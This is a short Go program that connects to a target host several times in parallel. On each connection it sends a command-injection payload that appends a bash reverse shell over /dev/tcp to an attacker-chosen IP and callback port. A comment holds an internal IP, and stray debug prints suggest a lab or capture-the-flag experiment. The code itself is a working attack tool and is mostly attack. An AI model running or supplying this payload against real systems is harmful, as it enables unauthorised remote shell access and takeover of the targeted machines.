package main

import (
	"flag"
	"fmt"
	"net"
	"strconv"
	"sync"
)

var (
	port          string
	ipaddress     string
	rev_ipaddress string
	wait          sync.WaitGroup
)

// 10.76.165.15
func init() {

	flag.StringVar(&port, "port", "9803", "The port on which to listen for connections")
	flag.StringVar(&ipaddress, "conn_ip", "localhost", "Target IP")
	flag.StringVar(&rev_ipaddress, "rev_ip", "localhost", "Reverse shell destination IP")
}

func runConnection(conn_address string, rev_address string, port string, incrament int) {
	conn, err := net.Dial("tcp", net.JoinHostPort(conn_address, port))
	fmt.Println("this is a test")
	if err != nil {
		fmt.Println(err)
		return
	}

	callbackPort := 9005 + incrament
	callback := strconv.Itoa(callbackPort)

	///Format the string
	shell := "; bash -i >& /dev/tcp/" + rev_address + "/" + callback + " 0>&1"

	_, err = conn.Write([]byte(shell)) //Could this be transmitted and ran?

	if err != nil {
		fmt.Println("BROKE")
		return
	}
	defer wait.Done()

}

func main() {
	// Connect to the server
	for i := 0; i < 5; i++ {
		wait.Add(1)
		go runConnection(ipaddress, rev_ipaddress, port, i)
	}
	wait.Wait()
}
